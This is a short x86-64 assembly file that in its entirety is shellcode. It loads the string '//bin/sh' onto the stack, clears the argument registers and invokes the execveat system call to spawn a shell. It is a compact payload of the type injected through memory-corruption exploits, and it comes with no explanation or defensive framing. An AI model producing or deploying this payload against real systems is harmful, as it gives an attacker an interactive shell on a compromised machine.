section .text
global _start
_start:
    xor rax, rax
    push rax
    mov rdi, 0x68732f6e69622f2f
    push rdi
    push rsp
    pop r8
    mov rsi, rax
    xchg rsi, r8
    mov r10, rax
    mov rdx, rax
    add al, 0x42
    inc ah
    syscall
